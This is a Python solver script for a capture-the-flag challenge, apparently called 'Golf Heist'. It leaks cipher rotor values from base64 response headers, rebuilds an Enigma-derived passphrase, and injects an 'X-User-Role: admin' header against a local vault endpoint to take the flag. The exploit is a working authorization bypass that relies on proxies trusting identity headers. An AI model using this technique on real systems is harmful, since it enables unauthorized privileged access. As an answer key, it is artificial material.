#!/usr/bin/env python3
"""Golf Heist solver.

1. Leak rotor values R1,R2,R3 from the 'teapot' pro-shop endpoints (base64 X-Golf-Hint).
2. Reproduce the Enigma-derived secret PHRASE.
3. Exploit the Caddy forward_auth header-injection (GHSA-7r4p-vjf4-gxv4): inject
   X-User-Role: admin into /api/vault/admin-item to get the FLAG.
"""
import sys, base64, requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"

# --- cipher constants copied from app/main.py (only to compute the phrase) ---
ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
W = {"I":"EKMFLGDQVZNTOWYHXUSPAIBRCJ","II":"AJDKSIRUXBLHWTMCQGZNPYFVOE",
     "III":"BDFHJLCPRTXVZNYEIWGAKMUSQO","REF":"YRUHQSLDPXNGOKMIEBFZCWVJAT"}
WORDS = {
    "A":["albatross","approach","ace"],   "B":["birdie","bogey","bunker"],
    "C":["caddy","chip","course"],        "D":["divot","dogleg","driver"],
    "E":["eagle","embed","escrow"],       "F":["fairway","flop","flag"],
    "G":["green","grip","gimme"],         "H":["handicap","hazard","hole"],
    "I":["iron","inside","index"],        "J":["jigger","juniper","joint"],
    "K":["knock","knoll","keeper"],       "L":["links","lie","loft"],
    "M":["mashie","mulligan","marker"],   "N":["niblick","net","nap"],
    "O":["open","out","oath"],            "P":["par","putt","pin"],
    "Q":["qualify","quest","quad"],       "R":["rough","round","ridge"],
    "S":["stroke","scratch","slope"],     "T":["tee","tap","triple"],
    "U":["under","uphill","uneven"],      "V":["vault","vantage","vector"],
    "W":["wedge","water","waggle"],       "X":["xeric","xerox","xenon"],
    "Y":["yardage","yips","yield"],       "Z":["zone","zenith","zero"],
}

def enigma(r1, r2, r3):
    def f(c, w, o): return w[(ALPHA.index(c)+o)%26]
    out = []
    for s in ["G","O","L"]:
        c=s; c=f(c,W["I"],r1%26); c=f(c,W["II"],r2%26); c=f(c,W["III"],r3%26)
        c=W["REF"][ALPHA.index(c)]; c=f(c,W["III"],(26-r3%26)%26)
        out.append(c)
    return out

def leak(path):
    r = requests.get(f"{BASE}{path}")
    return int(base64.b64decode(r.headers["X-Golf-Hint"]).decode())

R1 = leak("/pro-shop/inventory/clubs")
R2 = leak("/pro-shop/inventory/balls")
R3 = leak("/pro-shop/inventory/bags")
print(f"[+] Leaked rotors: R1={R1} R2={R2} R3={R3}")

letters = enigma(R1, R2, R3)
phrase = f"{WORDS[letters[0]][0]} {WORDS[letters[1]][1]} {WORDS[letters[2]][0]}"
print(f"[+] Enigma letters: {letters}")
print(f"[+] Recovered phrase: {phrase!r}")

# sanity check against the server
r = requests.post(f"{BASE}/api/vault/enter", json={"phrase": phrase})
print(f"[+] /api/vault/enter -> {r.status_code}: {r.json().get('tier')}")

# header injection -> admin
r = requests.post(f"{BASE}/api/vault/admin-item",
                  json={"phrase": phrase},
                  headers={"X-User-Role": "admin", "X-User-Id": "heist"})
data = r.json()
print(f"[+] /api/vault/admin-item -> {r.status_code}")
flag = data.get("flag")
print(f"\n[FLAG] {flag}")
if flag:
    open("flag.txt", "w").write(flag + "\n")
